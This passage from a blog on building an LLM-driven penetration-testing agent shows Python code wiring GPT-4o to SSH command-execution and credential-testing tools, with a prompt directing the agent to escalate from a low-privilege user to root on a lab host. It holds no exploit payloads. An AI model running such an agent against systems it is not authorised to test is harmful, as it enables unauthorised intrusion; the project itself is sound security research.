<span class="normal"><a href="#__codelineno-3-19">19</a></span>
<span class="normal"><a href="#__codelineno-3-20">20</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10"></a><span class="c1"># setup configuration from environment variables</span>
</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11"></a><span class="n">load_dotenv</span><span class="p">()</span>
</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12"></a><span class="n">conn</span> <span class="o">=</span> <span class="n">get_ssh_connection_from_env</span><span class="p">()</span>
</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13"></a><span class="n">get_or_fail</span><span class="p">(</span><span class="s2">&quot;OPENAI_API_KEY&quot;</span><span class="p">)</span> <span class="c1"># langgraph will use this env variable itself</span>
</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14"></a>
</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15"></a><span class="c1"># connect to the target system over SSH</span>
</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16"></a><span class="n">conn</span><span class="o">.</span><span class="n">connect</span><span class="p">()</span>
</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17"></a>
</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18"></a><span class="c1"># initialize the ChatOpenAI model and register the tool (ssh connection)</span>
</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19"></a><span class="n">llm</span> <span class="o">=</span> <span class="n">ChatOpenAI</span><span class="p">(</span><span class="n">model</span><span class="o">=</span><span class="s2">&quot;gpt-4o&quot;</span><span class="p">,</span> <span class="n">temperature</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
</span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20"></a><span class="n">tools</span> <span class="o">=</span> <span class="p">[</span><span class="n">SshExecuteTool</span><span class="p">(</span><span class="n">conn</span><span class="p">),</span> <span class="n">SshTestCredentialsTool</span><span class="p">(</span><span class="n">conn</span><span class="p">)]</span>
</span></code></pre></div></td></tr></table></div>
<p>Now we can use the <code>create_react_agent</code> method to create a new agent graph based upon our configured LLM and the known tools:</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Using create_react_agent</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-23">23</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23"></a><span class="n">agent_executor</span> <span class="o">=</span> <span class="n">create_react_agent</span><span class="p">(</span><span class="n">llm</span><span class="p">,</span> <span class="n">tools</span><span class="p">)</span>
</span></code></pre></div></td></tr></table></div>
<p>All that's left is to create the initial message (as detailed in our <a href="../../2024/10/10/first-steps-and-initial-version/">initial blog post</a>) and start the agent by calling <code>stream</code> on it while passing the mentioned initial message.</p>
<p>Again we are using <code>events</code> to output all tool calls and decisions that our agent is making.</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Starting the agent and output it's messages</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-26">26</a></span>
<span class="normal"><a href="#__codelineno-5-27">27</a></span>
<span class="normal"><a href="#__codelineno-5-28">28</a></span>
<span class="normal"><a href="#__codelineno-5-29">29</a></span>
<span class="normal"><a href="#__codelineno-5-30">30</a></span>
<span class="normal"><a href="#__codelineno-5-31">31</a></span>
<span class="normal"><a href="#__codelineno-5-32">32</a></span>
<span class="normal"><a href="#__codelineno-5-33">33</a></span>
<span class="normal"><a href="#__codelineno-5-34">34</a></span>
<span class="normal"><a href="#__codelineno-5-35">35</a></span>
<span class="normal"><a href="#__codelineno-5-36">36</a></span>
<span class="normal"><a href="#__codelineno-5-37">37</a></span>
<span class="normal"><a href="#__codelineno-5-38">38</a></span>
<span class="normal"><a href="#__codelineno-5-39">39</a></span>
<span class="normal"><a href="#__codelineno-5-40">40</a></span>
<span class="normal"><a href="#__codelineno-5-41">41</a></span>
<span class="normal"><a href="#__codelineno-5-42">42</a></span>
<span class="normal"><a href="#__codelineno-5-43">43</a></span>
<span class="normal"><a href="#__codelineno-5-44">44</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-26"><a id="__codelineno-5-26" name="__codelineno-5-26"></a><span class="n">template</span> <span class="o">=</span> <span class="n">PromptTemplate</span><span class="o">.</span><span class="n">from_template</span><span class="p">(</span><span class="s2">&quot;&quot;&quot;</span>
</span><span id="__span-5-27"><a id="__codelineno-5-27" name="__codelineno-5-27"></a><span class="s2">You are a low-privilege user </span><span class="si">{username}</span><span class="s2"> with password </span><span class="si">{password}</span><span class="s2"> on a linux system and your goal is to become the root user by executing commands on the remote system.</span>
</span><span id="__span-5-28"><a id="__codelineno-5-28" name="__codelineno-5-28"></a>
</span><span id="__span-5-29"><a id="__codelineno-5-29" name="__codelineno-5-29"></a><span class="s2">Do not repeat already tried escalation attacks. You should focus upon enumeration and privilege escalation. If you were able to become root, describe the used method as final message.</span>
</span><span id="__span-5-30"><a id="__codelineno-5-30" name="__codelineno-5-30"></a><span class="s2">&quot;&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">password</span><span class="p">)</span>
</span><span id="__span-5-31"><a id="__codelineno-5-31" name="__codelineno-5-31"></a>
</span><span id="__span-5-32"><a id="__codelineno-5-32" name="__codelineno-5-32"></a>
</span><span id="__span-5-33"><a id="__codelineno-5-33" name="__codelineno-5-33"></a><span class="n">events</span> <span class="o">=</span> <span class="n">agent_executor</span><span class="o">.</span><span class="n">stream</span><span class="p">(</span>
</span><span id="__span-5-34"><a id="__codelineno-5-34" name="__codelineno-5-34"></a>    <span class="p">{</span>
</span><span id="__span-5-35"><a id="__codelineno-5-35" name="__codelineno-5-35"></a>        <span class="s2">&quot;messages&quot;</span><span class="p">:</span> <span class="p">[</span>
</span><span id="__span-5-36"><a id="__codelineno-5-36" name="__codelineno-5-36"></a>            <span class="p">(</span><span class="s2">&quot;user&quot;</span><span class="p">,</span> <span class="n">template</span><span class="p">),</span>
</span><span id="__span-5-37"><a id="__codelineno-5-37" name="__codelineno-5-37"></a>        <span class="p">]</span>
</span><span id="__span-5-38"><a id="__codelineno-5-38" name="__codelineno-5-38"></a>    <span class="p">},</span>
</span><span id="__span-5-39"><a id="__codelineno-5-39" name="__codelineno-5-39"></a>    <span class="n">stream_mode</span><span class="o">=</span><span class="s2">&quot;values&quot;</span><span class="p">,</span>
</span><span id="__span-5-40"><a id="__codelineno-5-40" name="__codelineno-5-40"></a><span class="p">)</span>
</span><span id="__span-5-41"><a id="__codelineno-5-41" name="__codelineno-5-41"></a>
</span><span id="__span-5-42"><a id="__codelineno-5-42" name="__codelineno-5-42"></a><span class="k">for</span> <span class="n">event</span> <span class="ow">in</span> <span class="n">events</span><span class="p">:</span>
</span><span id="__span-5-43"><a id="__codelineno-5-43" name="__codelineno-5-43"></a>    <span class="k">if</span> <span class="s2">&quot;messages&quot;</span> <span class="ow">in</span> <span class="n">event</span><span class="p">:</span>
</span><span id="__span-5-44"><a id="__codelineno-5-44" name="__codelineno-5-44"></a>        <span class="n">event</span><span class="p">[</span><span class="s2">&quot;messages&quot;</span><span class="p">][</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">pretty_print</span><span class="p">()</span>
</span></code></pre></div></td></tr></table></div>
<p>And that's it! Pretty amazing, when you think about it.</p>
<p>The <code>node</code>/<code>edge</code> graph is exactly the same as in <a href="../../2024/10/10/first-steps-and-initial-version/">our initial hand-written version</a>.</p>
    
  </div>
</article>
      
        <article class="md-post md-post--excerpt">
  <header class="md-post__header">
    
      <nav class="md-post__authors md-typeset">
        
          <span class="md-author">
            <img src="https://avatars.githubusercontent.com/u/20667?v=4" alt="Andreas Happe">
          </span>
        
      </nav>
    
    <div class="md-post__meta md-meta">
      <ul class="md-meta__list">
        <li class="md-meta__item">
          <time datetime="2024-10-11 00:00:00">October 11, 2024</time></li>
        
          <li class="md-meta__item">
            in
            
              <a href="../../category/initial-journey/" class="md-meta__link">initial-journey</a></li>
        
        
          
          <li class="md-meta__item">
            
              5 min read
            
          </li>
        
      </ul>
      
    </div>
  </header>
  <div class="md-post__content md-typeset">
    <h2 id="improving-configuration-handling-esp-for-tools"><a class="toclink" href="../../2024/10/11/improving-configuration-handling-esp-for-tools/">Improving Configuration Handling, esp. for Tools</a></h2>
<p>While being quite happy that the <a href="../../2024/10/10/first-steps-and-initial-version/">initial prototype</a> worked within hours, its code was very prototype-y, i.e., much of its configuration was hard-coded. In a second step, we want to fix this by making our target information (the SSH connection) configurable and remove all hard-coded credentials from the code.</p>
<h3 id="big-picture"><a class="toclink" href="../../2024/10/11/improving-configuration-handling-esp-for-tools/#big-picture">Big Picture</a></h3>
<p>We are already using <a href="https://pypi.org/project/python-dotenv/">python-dotenv</a> for some of our configuration so it makes sense to further utilize this for more configuration data. In the improved implementation, our <code>.env</code> will look like this:</p>
<div class="language-ini highlight"><span class="filename">.env: Example configuration</span><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="na">OPENAI_API_KEY</span><span class="o">=</span><span class="s">&#39;secret openai API key&#39;</span>
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="na">TARGET_HOST</span><span class="o">=</span><span class="s">192.168.121.112</span>
</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="na">TARGET_HOSTNAME</span><span class="o">=</span><span class="s">&#39;test-1&#39;</span>
</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="na">TARGET_USERNAME</span><span class="o">=</span><span class="s">&#39;lowpriv&#39;</span>
</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="na">TARGET_PASSWORD</span><span class="o">=</span><span class="s">&#39;trustno1&#39;</span>
</span></code></pre></div>
<p>The prototype will read this for configuration data. With this, the initial part of the problem (getting the configuration data) should be solved, leaving the second part: how to use the configuration data within our tools?</p>
<p>After looking into the <a href="https://api.python.langchain.com/en/latest/tools/langchain_core.tools.tool.html">@tool annotation</a> for functions, this did not look like the perfect approach. Instead we opted towards subclassing <a href="https://api.python.langchain.com/en/latest/core/tools/langchain_core.tools.base.BaseTool.html">BaseTool</a>. This allows us to configure our tool-class through its standard constructor, i.e., pass the <code>SSHConnection</code> into it, and then use the connection when the tool sis called by the LLM through its <code>_run()</code> method.</p>
<p>You can find the resulting source code in <a href="https://github.com/andreashappe/offensivegraphs/tree/26c02488e7da504cade55fda0094225bac055f01">this github version</a>. Please note, that I had a bug initially (<a href="https://github.com/andreashappe/offensivegraphs/commit/576105f2a358c7aa6877d3bcf0395a5ec2997e7f">fixed here</a>). I wilkl use the fixed source code within this post to keep things easier to read.</p>
<p>Let's start with our updated tool that will be configurable:</p>
<h3 id="making-our-tool-configurable-by-switching-to-basetool"><a class="toclink" href="../../2024/10/11/improving-configuration-handling-esp-for-tools/#making-our-tool-configurable-by-switching-to-basetool">Making our Tool configurable by switching to <code>BaseTool</code></a></h3>
<p>You can find the full source code at <a href="https://github.com/andreashappe/offensivegraphs/blob/26c02488e7da504cade55fda0094225bac055f01/src/ssh.py">within github</a>. This change was pretty straight-forward.</p>
<p>Instead of writing a function, we now create a class for each tool. We have to subclass <a href="https://api.python.langchain.com/en/latest/tools/langchain_core.tools.BaseTool.html">BaseTool</a>, the parameters for our tool are now defined in a separate class which is a subclass of <code>BaseModel</code>:</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">ssh.py: switching to BaseModel</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-48">48</a></span>
<span class="normal"><a href="#__codelineno-11-49">49</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-48"><a id="__codelineno-11-48" name="__codelineno-11-48"></a><span class="k">class</span> <span class="nc">SshExecuteInput</span><span class="p">(</span><span class="n">BaseModel</span><span class="p">):</span>
</span><span id="__span-11-49"><a id="__codelineno-11-49" name="__codelineno-11-49"></a>    <span class="n">command</span><span class="p">:</span> <span class="nb">str</span><span class="o">=</span> <span class="n">Field</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s2">&quot;the command to execute&quot;</span><span class="p">)</span>
</span></code></pre></div></td></tr></table></div>
<p>Now for the tool class:</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">ssh.py: switching to BaseModel</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-51">51</a></span>
<span class="normal"><a href="#__codelineno-12-52">52</a></span>
<span class="normal"><a href="#__codelineno-12-53">53</a></span>
<span class="normal"><a href="#__codelineno-12-54">54</a></span>
<span class="normal"><a href="#__codelineno-12-55">55</a></span>
<span class="normal"><a href="#__codelineno-12-56">56</a></span>
<span class="normal"><a href="#__codelineno-12-57">57</a></span>
<span class="normal"><a href="#__codelineno-12-58">58</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-51"><a id="__codelineno-12-51" name="__codelineno-12-51"></a><span class="c1"># Note: It&#39;s important that every field has type hints. BaseTool is a</span>
</span><span id="__span-12-52"><a id="__codelineno-12-52" name="__codelineno-12-52"></a><span class="c1"># Pydantic class and not having type hints can lead to unexpected behavior.</span>
</span><span id="__span-12-53"><a id="__codelineno-12-53" name="__codelineno-12-53"></a><span class="k">class</span> <span class="nc">SshExecuteTool</span><span class="p">(</span><span class="n">BaseTool</span><span class="p">):</span>
</span><span id="__span-12-54"><a id="__codelineno-12-54" name="__codelineno-12-54"></a>    <span class="n">name</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&quot;SshExecuteTool&quot;</span>
</span><span id="__span-12-55"><a id="__codelineno-12-55" name="__codelineno-12-55"></a>    <span class="n">description</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&quot;Execute command over SSH on the remote machine&quot;</span>
</span><span id="__span-12-56"><a id="__codelineno-12-56" name="__codelineno-12-56"></a>    <span class="n">args_schema</span><span class="p">:</span> <span class="n">Type</span><span class="p">[</span><span class="n">BaseModel</span><span class="p">]</span> <span class="o">=</span> <span class="n">SshExecuteInput</span>
</span><span id="__span-12-57"><a id="__codelineno-12-57" name="__codelineno-12-57"></a>    <span class="n">return_direct</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span>
</span><span id="__span-12-58"><a id="__codelineno-12-58" name="__codelineno-12-58"></a>    <span class="n">conn</span><span class="p">:</span> <span class="n">SSHConnection</span>
</span></code></pre></div></td></tr></table></div>
<p>You can see that we are now using instance variables (<code>name</code> and <code>description</code>) to describe the tool. <code>args_schema</code> points to the class that describes our accepted input parameters. <code>return_direct</code> is set to <code>False</code>. If set to <code>True</code>, langgraph agents will stop when the Tool stops. This is not what we intend, as the output of the Tool should be passed on to the next <code>node</code> in our case.</p>
<p>Finally <code>conn</code> is the <code>SSHConnection</code> that we want to configure and use later on. Next, we set it through the class constructor:</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">ssh.py: the class constructor</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-60">60</a></span>
<span class="normal"><a href="#__codelineno-13-61">61</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-60"><a id="__codelineno-13-60" name="__codelineno-13-60"></a>    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">conn</span><span class="p">:</span> <span class="n">SSHConnection</span><span class="p">):</span>
</span><span id="__span-13-61"><a id="__codelineno-13-61" name="__codelineno-13-61"></a>        <span class="nb">super</span><span class="p">(</span><span class="n">SshExecuteTool</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="n">conn</span><span class="o">=</span><span class="n">conn</span><span class="p">)</span>
</span></code></pre></div></td></tr></table></div>
<p>We call the superclass constructor and additionally set the <code>conn</code> instance variable.</p>
<p>Now we can use it within the <code>_run</code> method that will be called when the tool is invoked:</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">ssh.py: And the Run Method</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-63">63</a></span>
<span class="normal"><a href="#__codelineno-14-64">64</a></span>
<span class="normal"><a href="#__codelineno-14-65">65</a></span>
<span class="normal"><a href="#__codelineno-14-66">66</a></span>
<span class="normal"><a href="#__codelineno-14-67">67</a></span>
<span class="normal"><a href="#__codelineno-14-68">68</a></span>
<span class="normal"><a href="#__codelineno-14-69">69</a></span>
<span class="normal"><a href="#__codelineno-14-70">70</a></span>
<span class="normal"><a href="#__codelineno-14-71">71</a></span>
<span class="normal"><a href="#__codelineno-14-72">72</a></span>
<span class="normal"><a href="#__codelineno-14-73">73</a></span>
<span class="normal"><a href="#__codelineno-14-74">74</a></span>
<span class="normal"><a href="#__codelineno-14-75">75</a></span>
<span class="normal"><a href="#__codelineno-14-76">76</a></span>
<span class="normal"><a href="#__codelineno-14-77">77</a></span>
<span class="normal"><a href="#__codelineno-14-78">78</a></span>
<span class="normal"><a href="#__codelineno-14-79">79</a></span>
<span class="normal"><a href="#__codelineno-14-80">80</a></span>
<span class="normal"><a href="#__codelineno-14-81">81</a></span>
<span class="normal"><a href="#__codelineno-14-82">82</a></span>
<span class="normal"><a href="#__codelineno-14-83">83</a></span>
<span class="normal"><a href="#__codelineno-14-84">84</a></span>
<span class="normal"><a href="#__codelineno-14-85">85</a></span>
<span class="normal"><a href="#__codelineno-14-86">86</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-63"><a id="__codelineno-14-63" name="__codelineno-14-63"></a>    <span class="k">def</span> <span class="nf">_run</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">command</span><span class="p">:</span><span class="nb">str</span><span class="p">,</span> <span class="n">run_manager</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="n">CallbackManagerForToolRun</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
</span><span id="__span-14-64"><a id="__codelineno-14-64" name="__codelineno-14-64"></a><span class="w">        </span><span class="sd">&quot;&quot;&quot;Run the command over the (already established) SSH connection.&quot;&quot;&quot;</span>
</span><span id="__span-14-65"><a id="__codelineno-14-65" name="__codelineno-14-65"></a>
</span><span id="__span-14-66"><a id="__codelineno-14-66" name="__codelineno-14-66"></a>        <span class="c1"># if we trigger a sudo-prompt, try to fill it with our password</span>
</span><span id="__span-14-67"><a id="__codelineno-14-67" name="__codelineno-14-67"></a>        <span class="n">sudo_pass</span> <span class="o">=</span> <span class="n">Responder</span><span class="p">(</span>
</span><span id="__span-14-68"><a id="__codelineno-14-68" name="__codelineno-14-68"></a>            <span class="n">pattern</span><span class="o">=</span><span class="sa">r</span><span class="s2">&quot;\[sudo\] password for &quot;</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">conn</span><span class="o">.</span><span class="n">username</span> <span class="o">+</span> <span class="s2">&quot;:&quot;</span><span class="p">,</span>
</span><span id="__span-14-69"><a id="__codelineno-14-69" name="__codelineno-14-69"></a>            <span class="n">response</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">conn</span><span class="o">.</span><span class="n">password</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span>
</span><span id="__span-14-70"><a id="__codelineno-14-70" name="__codelineno-14-70"></a>        <span class="p">)</span>
</span><span id="__span-14-71"><a id="__codelineno-14-71" name="__codelineno-14-71"></a>
</span><span id="__span-14-72"><a id="__codelineno-14-72" name="__codelineno-14-72"></a>        <span class="n">out</span> <span class="o">=</span> <span class="n">StringIO</span><span class="p">()</span>
</span><span id="__span-14-73"><a id="__codelineno-14-73" name="__codelineno-14-73"></a>        <span class="k">try</span><span class="p">:</span>
</span><span id="__span-14-74"><a id="__codelineno-14-74" name="__codelineno-14-74"></a>            <span class="bp">self</span><span class="o">.</span><span class="n">conn</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">pty</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">warn</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">out_stream</span><span class="o">=</span><span class="n">out</span><span class="p">,</span> <span class="n">watchers</span><span class="o">=</span><span class="p">[</span><span class="n">sudo_pass</span><span class="p">],</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
</span><span id="__span-14-75"><a id="__codelineno-14-75" name="__codelineno-14-75"></a>        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span><span id="__span-14-76"><a id="__codelineno-14-76" name="__codelineno-14-76"></a>            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;TIMEOUT! Could we have become root?&quot;</span><span class="p">)</span>
</span><span id="__span-14-77"><a id="__codelineno-14-77" name="__codelineno-14-77"></a>        <span class="n">out</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span id="__span-14-78"><a id="__codelineno-14-78" name="__codelineno-14-78"></a>        <span class="n">tmp</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
</span><span id="__span-14-79"><a id="__codelineno-14-79" name="__codelineno-14-79"></a>        <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">out</span><span class="o">.</span><span class="n">readlines</span><span class="p">():</span>
</span><span id="__span-14-80"><a id="__codelineno-14-80" name="__codelineno-14-80"></a>            <span class="k">if</span> <span class="ow">not</span> <span class="n">line</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&quot;[sudo] password for &quot;</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">conn</span><span class="o">.</span><span class="n">username</span> <span class="o">+</span> <span class="s2">&quot;:&quot;</span><span class="p">):</span>
</span><span id="__span-14-81"><a id="__codelineno-14-81" name="__codelineno-14-81"></a>                <span class="n">line</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>
</span><span id="__span-14-82"><a id="__codelineno-14-82" name="__codelineno-14-82"></a>                <span class="n">tmp</span> <span class="o">=</span> <span class="n">tmp</span> <span class="o">+</span> <span class="n">line</span>
</span><span id="__span-14-83"><a id="__codelineno-14-83" name="__codelineno-14-83"></a>
</span><span id="__span-14-84"><a id="__codelineno-14-84" name="__codelineno-14-84"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;cmd executed:&quot;</span><span class="p">,</span> <span class="n">command</span><span class="p">)</span>
</span><span id="__span-14-85"><a id="__codelineno-14-85" name="__codelineno-14-85"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;result: &quot;</span><span class="p">,</span> <span class="n">tmp</span><span class="p">)</span>
</span><span id="__span-14-86"><a id="__codelineno-14-86" name="__codelineno-14-86"></a>        <span class="k">return</span> <span class="n">tmp</span>
</span></code></pre></div></td></tr></table></div>
<p>Again, please ignore the ugly SSH implementation code but note that we jsut return the result on line 86 as string.</p>
<p>Next step is wiring everything up within our prototype code.</p>
<h3 id="improving-the-configuration-handling"><a class="toclink" href="../../2024/10/11/improving-configuration-handling-esp-for-tools/#improving-the-configuration-handling">Improving the Configuration Handling</a></h3>
<p>We now have a tool that's configurable while all needed configuration is in the <code>.env</code> file. Let's connect them! First, we introduce a simple helper function that receives an environmental variable or throws an error otherwise:</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">initial_version.py: environment variable helper</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-16">16</a></span>
<span class="normal"><a href="#__codelineno-15-17">17</a></span>
<span class="normal"><a href="#__codelineno-15-18">18</a></span>
<span class="normal"><a href="#__codelineno-15-19">19</a></span>
<span class="normal"><a href="#__codelineno-15-20">20</a></span>
<span class="normal"><a href="#__codelineno-15-21">21</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-16"><a id="__codelineno-15-16" name="__codelineno-15-16"></a><span class="k">def</span> <span class="nf">get_or_fail</span><span class="p">(</span><span class="n">name</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
</span><span id="__span-15-17"><a id="__codelineno-15-17" name="__codelineno-15-17"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Get an environment variable or raise an error if it&#39;s not set.&quot;&quot;&quot;</span>
</span><span id="__span-15-18"><a id="__codelineno-15-18" name="__codelineno-15-18"></a>    <span class="n">value</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
</span><span id="__span-15-19"><a id="__codelineno-15-19" name="__codelineno-15-19"></a>    <span class="k">if</span> <span class="n">value</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span><span id="__span-15-20"><a id="__codelineno-15-20" name="__codelineno-15-20"></a>        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Environment variable </span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s2"> not set&quot;</span><span class="p">)</span>
</span><span id="__span-15-21"><a id="__codelineno-15-21" name="__codelineno-15-21"></a>    <span class="k">return</span> <span class="n">value</span>
</span></code></pre></div></td></tr></table></div>
<p>Now we can use <code>load_dotenv()</code> to load the variables set within <code>.env</code> into our environment and us the helper to retrieve all the needed SSH parameters. With this data we can finally create our <code>SSHConnection</code>. We extracted this into a separate method for readability:</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">ssh.py: create a new SSH connection</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-16-123">123</a></span>
<span class="normal"><a href="#__codelineno-16-124">124</a></span>
<span class="normal"><a href="#__codelineno-16-125">125</a></span>
<span class="normal"><a href="#__codelineno-16-126">126</a></span>
<span class="normal"><a href="#__codelineno-16-127">127</a></span>
<span class="normal"><a href="#__codelineno-16-128">128</a></span>
<span class="normal"><a href="#__codelineno-16-129">129</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-123"><a id="__codelineno-16-123" name="__codelineno-16-123"></a><span class="k">def</span> <span class="nf">get_ssh_connection_from_env</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="n">SSHConnection</span><span class="p">:</span>
</span><span id="__span-16-124"><a id="__codelineno-16-124" name="__codelineno-16-124"></a>    <span class="n">host</span> <span class="o">=</span> <span class="n">get_or_fail</span><span class="p">(</span><span class="s2">&quot;TARGET_HOST&quot;</span><span class="p">)</span>
</span><span id="__span-16-125"><a id="__codelineno-16-125" name="__codelineno-16-125"></a>    <span class="n">hostname</span> <span class="o">=</span> <span class="n">get_or_fail</span><span class="p">(</span><span class="s2">&quot;TARGET_HOSTNAME&quot;</span><span class="p">)</span>
</span><span id="__span-16-126"><a id="__codelineno-16-126" name="__codelineno-16-126"></a>    <span class="n">username</span> <span class="o">=</span> <span class="n">get_or_fail</span><span class="p">(</span><span class="s2">&quot;TARGET_USERNAME&quot;</span><span class="p">)</span>
</span><span id="__span-16-127"><a id="__codelineno-16-127" name="__codelineno-16-127"></a>    <span class="n">password</span> <span class="o">=</span> <span class="n">get_or_fail</span><span class="p">(</span><span class="s2">&quot;TARGET_PASSWORD&quot;</span><span class="p">)</span>
</span><span id="__span-16-128"><a id="__codelineno-16-128" name="__codelineno-16-128"></a>
</span><span id="__span-16-129"><a id="__codelineno-16-129" name="__codelineno-16-129"></a>    <span class="k">return</span> <span class="n">SSHConnection</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">host</span><span class="p">,</span> <span class="n">hostname</span><span class="o">=</span><span class="n">hostname</span><span class="p">,</span> <span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">password</span><span class="p">)</span>
</span></code></pre></div></td></tr></table></div>
<p>Finally, we can wire everything up within our <a href="https://github.com/andreashappe/offensivegraphs/blob/26c02488e7da504cade55fda0094225bac055f01/src/initial_version.py">prototype</a>:</p>
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">initial_version.py: retrieving configuration data</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-24">24</a></span>
